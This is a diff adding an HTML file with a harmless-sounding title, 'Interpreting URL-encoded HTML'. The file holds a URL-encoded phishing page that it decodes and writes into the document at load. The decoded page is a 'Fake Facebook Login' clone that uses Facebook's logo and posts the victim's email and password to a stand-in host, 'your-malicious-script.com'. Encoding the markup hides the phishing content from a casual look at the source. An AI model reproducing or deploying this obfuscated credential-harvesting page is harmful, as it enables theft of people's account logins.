@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Interpreting URL-encoded HTML</title>
+  </head>
+  <body>
+    <script>
+      // URL-encoded HTML code
+      var urlEncodedHTML = "%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%20%20%3Chead%3E%0A%20%20%20%20%3Ctitle%3EFake%20Facebook%20Login%3C%2Ftitle%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20body%20%7B%0A%20%20%20%20%20%20%20%20background%3A%20%23f0f2f5%3B%0A%20%20%20%20%20%20%20%20font-family%3A%20Arial%2C%20sans-serif%3B%0A%20%20%20%20%7D%0A%20%20%20%20%20%20.container%20%7B%0A%20%20%20%20%20%20%20%20max-width%3A%20320px%3B%0A%20%20%20%20%20%20%20%20margin%3A%200%20auto%3B%0A%20%20%20%20%20%20%20%20padding%3A%2020px%3B%0A%20%20%20%20%20%20%20%20background%3A%20%23fff%3B%0A%20%20%20%20%20%20%20%20border-radius%3A%205px%3B%0A%20%20%20%20%20%20%20%20box-shadow%3A%200%202px%204px%20rgba(0%2C%200%2C%200%2C%200.1)%3B%0A%20%20%20%20%7D%0A%20%20%20%20%20%20h2%20%7B%0A%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20margin-bottom%3A%2020px%3B%0A%20%20%20%20%7D%0A%20%20%20%20%20%20.logo%20%7B%0A%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%7D%0A%20%20%20%20%20%20.logo%20img%20%7B%0A%20%20%20%20%20%20%20%20width%3A%20200px%3B%0A%20%20%20%20%7D%0A%20%20%20%20%20%20input%2C%20button%20%7B%0A%20%20%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20padding%3A%2010px%3B%0A%20%20%20%20%20%20%20%20margin-bottom%3A%2015px%3B%0A%20%20%20%20%20%20%20%20border%3A%20none%3B%0A%20%20%20%20%20%20%20%20border-radius%3A%203px%3B%0A%20%20%20%20%7D%0A%20%20%20%20%20%20button%20%7B%0A%20%20%20%20%20%20%20%20background%3A%20%230069e3%3B%0A%20%20%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20%20%20cursor%3A%20pointer%3B%0A%20%20%20%20%20%20%20%20transition%3A%20background%200.3s%3B%0A%20%20%20%20%7D%0A%20%20%20%20%20%20button%3Ahover%20%7B%0A%20%20%20%20%20%20%20%20background%3A%20%232266b3%3B%0A%20%20%20%20%7D%0A%20%20%20%20%3C%2Fstyle%3E%0A%20%20%3C%2Fhead%3E%0A%20%20%3Cbody%3E%0A%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22logo%22%3E%0A%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22https%3A%2F%2Fwww.facebook.com%2Fimages%2Ffb_icon_325x325.png%22%20alt%3D%22Facebook%20Logo%22%3E%0A%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%3Ch2%3ELog%20In%3C%2Fh2%3E%0A%20%20%20%20%20%20%3Cform%20action%3D%22http%3A%2F%2Fyour-malicious-script.com%22%20method%3D%22post%22%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22text%22%20name%3D%22email%22%20placeholder%3D%22Email%20or%20Phone%20Number%22%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22password%22%20name%3D%22password%22%20placeholder%3D%22Password%22%3E%0A%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%22submit%22%3ELog%20In%3C%2Fbutton%3E%0A%20%20%20%20%20%20%20%20%3Cp%3E%3Ca%20href%3D%22https%3A%2F%2Fwww.facebook.com%2Frecover%2Finitiate%22%3EForgot%20Password%3F%3C%2Fa%3E%3C%2Fp%3E%0A%20%20%20%20%3C%2Fform%3E%0A%20%20%3C%2Fdiv%3E%0A%20%20%3C%2Fbody%3E%0A%3C%2Fhtml%3E";
+
+      // Decoding and writing the HTML code to the document
+      document.write(unescape(urlEncodedHTML));
+    </script>
+  </body>
+</html>
